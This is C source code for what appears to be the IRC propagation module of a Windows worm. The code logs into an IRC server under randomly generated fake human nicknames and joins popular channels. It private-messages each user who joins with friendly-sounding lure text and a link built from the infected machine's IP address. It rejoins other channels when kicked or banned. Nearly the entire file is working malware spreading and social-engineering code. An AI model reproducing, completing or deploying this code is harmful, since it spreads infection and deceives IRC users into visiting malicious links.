   bool SendLine(SOCKET SocketDesc, char LineToSend[]);
   bool RecvLine(SOCKET SocketDesc, char *RecvBuffer);
   bool HandlePing(SOCKET SocketDesc, char *RecvBuffer);
   void GetNickname(char *NickBuffer);
   void GetSpamUrl(char *MessageBuffer, char VictimNick[]);

   bool IrcSpread(char IrcServer[])
   {
       WSADATA         WsaData;
       SOCKET          SocketDesc;
       LPHOSTENT       Hostent;
       sockaddr_in     SockAddr;
       char            RecvBuffer[1024];
       int             RanNumber= 0;
       int             ChannelStart = 0;
       int             ChannelEnd = 0;
       char            CharBuffer[2];
       char            ChannelName[30];
       int             NickStart = 0;
       int             NickEnd = 0;
       char            VictimNick[30];
       char            NickName[30];

       if(WSAStartup(MAKEWORD(1, 0), &WsaData) == 0)
       {
           SocketDesc = socket(AF_INET, SOCK_STREAM, 0);

           if(SocketDesc != INVALID_SOCKET)
           {
               Hostent = gethostbyname(IrcServer);

               if(Hostent != 0)
               {
                   SockAddr.sin_family = AF_INET;
                   SockAddr.sin_port = htons(6667);
                   SockAddr.sin_addr = *(LPIN_ADDR)*Hostent->h_addr_list;

                   if(connect(SocketDesc, (LPSOCKADDR)&SockAddr, sizeof(SockAddr)) != SOCKET_ERROR)
                   {
                       lstrcpy(RecvBuffer, "NICK ");
                       GetNickname(NickName);
                       lstrcat(RecvBuffer, NickName);
                       SendLine(SocketDesc, RecvBuffer);

                       lstrcpy(RecvBuffer, "USER ");
                       lstrcat(RecvBuffer, NickName);
                       lstrcat(RecvBuffer, " * 8 :");
                       CharLowerBuff(NickName, lstrlen(NickName));
                       lstrcat(RecvBuffer, NickName);
                       lstrcat(RecvBuffer, " ");
                       lstrcat(RecvBuffer, NickName);
                       SendLine(SocketDesc, RecvBuffer);

                       while(strstr((char *)RecvBuffer, "MOTD") == 0)
                       {
                           if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                           HandlePing(SocketDesc, RecvBuffer);
                       }

                       while(RanNumber < 50)
                       {
                           RanNumber = RandomNumber(200);
                       }

                       wsprintf(RecvBuffer, "LIST >%d", RanNumber);
                       SendLine(SocketDesc, RecvBuffer);

                       while(strstr(RecvBuffer, "#") == 0)
                       {
                           if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                       }

                       for(int i = 0; i < 6; i++)
                       {
                           RanNumber = RandomNumber(20);

                           while(RanNumber != 0)
                           {
                               if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                               if(strstr(RecvBuffer, "323") != 0) goto ListEnd1;
                               RanNumber--;
                           }

                           if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                           if(strstr(RecvBuffer, "323") != 0) goto ListEnd1;

                           ChannelStart = 0;
                           ChannelEnd = 0;

                           while(lstrcmp(CharBuffer, "#") != 0)
                           {
                               lstrcpyn(CharBuffer, RecvBuffer + ChannelStart, 2);
                               ChannelStart++;
                           }

                           ChannelEnd = ChannelStart;

                           while(lstrcmp(CharBuffer, " ") != 0)
                           {
                               lstrcpyn(CharBuffer, RecvBuffer + ChannelEnd, 2);
                               ChannelEnd++;
                           }

                           lstrcpyn(ChannelName, RecvBuffer + ChannelStart - 1, ChannelEnd - ChannelStart + 1);

                           lstrcpy(RecvBuffer, "JOIN ");
                           lstrcat(RecvBuffer, ChannelName);

                           SendLine(SocketDesc, RecvBuffer);
                       }

   ListEnd1:
                       SendLine(SocketDesc, "LIST STOP");

                       while(1)
                       {
                           if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                           HandlePing(SocketDesc, RecvBuffer);

                           if(strstr(RecvBuffer, "change too fast") != 0)
                           {
                               for(int t = 0; t < 30; t++) //wait 30 messages from server (PING, JOIN...)
                               {
                                   if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                                   HandlePing(SocketDesc, RecvBuffer);
                               }

                               continue;
                           }

                           if(strstr(RecvBuffer, "JOIN") != 0)
                           {
                               NickStart = 0;
                               NickEnd = 0;
                               lstrcpy(CharBuffer, "");

                               while(lstrcmp(CharBuffer, ":") != 0)
                               {
                                   lstrcpyn(CharBuffer, RecvBuffer + NickStart, 2);
                                   NickStart++;
                               }

                               NickEnd = NickStart;

                               while(lstrcmp(CharBuffer, "!") != 0)
                               {
                                   lstrcpyn(CharBuffer, RecvBuffer + NickEnd, 2);
                                   NickEnd++;
                               }

                               lstrcpyn(VictimNick, RecvBuffer + NickStart, NickEnd - NickStart);
                               CharLowerBuff(VictimNick, lstrlen(VictimNick));

                               if(lstrcmp(NickName, VictimNick) != 0 && lstrlen(VictimNick) < 14)
                               {
                                   Sleep(RandomNumber(60000));
                                   GetSpamUrl(RecvBuffer, VictimNick);
                                   SendLine(SocketDesc, RecvBuffer);
                               }

                               continue;
                           }

                           if(strstr(RecvBuffer, "KICK") != 0 || strstr(RecvBuffer, "474") != 0) //kicked or banned
                           {                                                                     //join new chan
                               RanNumber = 0;

                               while(RanNumber < 30)
                               {
                                   RanNumber = RandomNumber(100);
                               }

                               wsprintf(RecvBuffer, "LIST >%d", RanNumber);
                               SendLine(SocketDesc, RecvBuffer);

                               while(strstr(RecvBuffer, "#") == 0)
                               {
                                   if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                               }

                               RanNumber = RandomNumber(100);

                               while(RanNumber != 0)
                               {
                                   RecvLine(SocketDesc, RecvBuffer);
                                   if(strstr(RecvBuffer, "323") != 0) goto ListEnd2;
                                   RanNumber--;
                               }

                               if(RecvLine(SocketDesc, RecvBuffer) == false) return false;
                               if(strstr(RecvBuffer, "323") != 0) goto ListEnd2;

                               ChannelStart = 0;
                               ChannelEnd = 0;

                               while(lstrcmp(CharBuffer, "#") != 0)
                               {
                                   lstrcpyn(CharBuffer, RecvBuffer + ChannelStart, 2);
                                   ChannelStart++;
                               }

                               ChannelEnd = ChannelStart;

                               while(lstrcmp(CharBuffer, " ") != 0)
                               {
                                   lstrcpyn(CharBuffer, RecvBuffer + ChannelEnd, 2);
                                   ChannelEnd++;
                               }

                               lstrcpyn(ChannelName, RecvBuffer + ChannelStart - 1, ChannelEnd - ChannelStart + 1);

                               lstrcpy(RecvBuffer, "JOIN ");
                               lstrcat(RecvBuffer, ChannelName);

                               SendLine(SocketDesc, RecvBuffer);
   ListEnd2: //yeh i know, jumps in c++, buh
                               SendLine(SocketDesc, "LIST STOP");
                           }
                       }
                   }
               }
           }
       }

       WSACleanup();

       return false;
   }

   bool SendLine(SOCKET SocketDesc, char LineToSend[])
   {
       char    SendBuffer[4096];

       lstrcpy(SendBuffer, LineToSend);
       lstrcat(SendBuffer, "\r\n");

       if(send(SocketDesc, SendBuffer, lstrlen(SendBuffer), 0) != SOCKET_ERROR)
       {
           return true;
       }

       return false;
   }

   bool RecvLine(SOCKET SocketDesc, char *RecvBuffer)
   {
       char    CharBuffer[2];
       char    CharBufferTemp[2];

       lstrcpy(RecvBuffer, "");

       while(lstrcmp(CharBufferTemp, "\n") != 0)
       {
           if(recv(SocketDesc, CharBuffer, 1, 0) != SOCKET_ERROR)
           {
               lstrcpyn(CharBufferTemp, CharBuffer, 2);
               lstrcat(RecvBuffer, CharBufferTemp);
           }
           else
           {
               return false;
           }
       }

       return true;
   }

   bool HandlePing(SOCKET SocketDesc, char *RecvBuffer)
   {
       char    PongBuffer[1024];

       if(strstr(RecvBuffer, "PING") != 0)
       {
           lstrcpy(PongBuffer, "PONG ");
           lstrcat(PongBuffer, RecvBuffer + 6);

           if(SendLine(SocketDesc, PongBuffer) == true)
           {
               return true;
           }
       }

       return false;
   }

   void GetNickname(char *NickBuffer)
   {
       char *NickPart1[] = {
                               "",
                               "Slim",
                               "Fat",
                               "Sexy",
                               "The",
                               "Iam"
                           };

       char *NickPart2[] = {
                               "Alex",
                               "Kim",
                               "Nina",
                               "Nicole",
                               "Ivonne",
                               "Tim",
                               "Fergie",
                               "Mandy",
                               "Theresa",
                               "Basti",
                               "Nataly",
                               "Girl",
                               "Boy",
                               "Antje",
                               "Gal",
                               "Dude",
                               "Anna",
                               "Raffie",
                               "Boing",
                               "Frank",
                               "Steve",
                               "Diablo",
                               "Shawn",
                               "TamTam",
                               "Love",
                               "Hate"
                           };

       char    RandomNum[4];
       int     RandomNumm = 0;
       int     NickPosition = 0;

       if(RandomNumber(10) < 8)
       {
           lstrcpy(NickBuffer, NickPart1[RandomNumber(6)]);
           lstrcat(NickBuffer, NickPart2[RandomNumber(26)]);
           wsprintf(RandomNum, "%d", RandomNumber(31));
           lstrcat(NickBuffer, RandomNum);
       }
       else
       {
           while(NickPosition < 8)
           {
               while(RandomNumm < 97)
               {
                   RandomNumm = RandomNumber(123);
               }

               NickBuffer[NickPosition] = RandomNumm;
               NickPosition++;
               RandomNumm = 0;
           }

           NickBuffer[NickPosition] = 0;
       }

       return;
   }

   void GetSpamUrl(char *MessageBuffer, char VictimNick[])
   {
       char    IP[100];
       char    SpamURL[MAX_PATH];

       char *MsgPart1[] =  {
                               "hi, ",
                               "hello, ",
                               "hey",
                               "heya ",
                               "hoy, ",
                               "lo, ",
                               "ahoy, ",
                               ""
                           };

       char *MsgPart2[] =  {
                               "!",
                               "...",
                               " :)",
                               " :D",
                               "   ",
                               ""
                           };

       char *MsgPart3[] =  {
                               " Please check out my new site: ",
                               " hehe, i made a little site, tell me what you think... ",
                               " i am now into webpage programming, check this: ",
                               " maybe you can help, i need some better template for my webpage. check this shit :D ",
                               " ehehehehe, my little page, just some pictures on it: ",
                               " can you help me making a better website? i have only this: ",
                               " my small website, just great ... ",
                               " grrr, look wich stupid website i have found: ",
                               " HAHAHAHAHAHAHA, check this biatch out: ",
                               " some crazy pictures on this website >> ",
                               ""
                           };

       lstrcpy(MessageBuffer, "PRIVMSG ");
       lstrcat(MessageBuffer, VictimNick);
       lstrcat(MessageBuffer, " :");
       lstrcat(MessageBuffer, MsgPart1[RandomNumber(8)]);
       lstrcat(MessageBuffer, VictimNick);
       lstrcat(MessageBuffer, MsgPart2[RandomNumber(6)]);
       lstrcat(MessageBuffer, MsgPart3[RandomNumber(11)]);

       GetIP(IP);
       AbuseUrl(IP, SpamURL);
       lstrcat(MessageBuffer, SpamURL);

       return;
   }
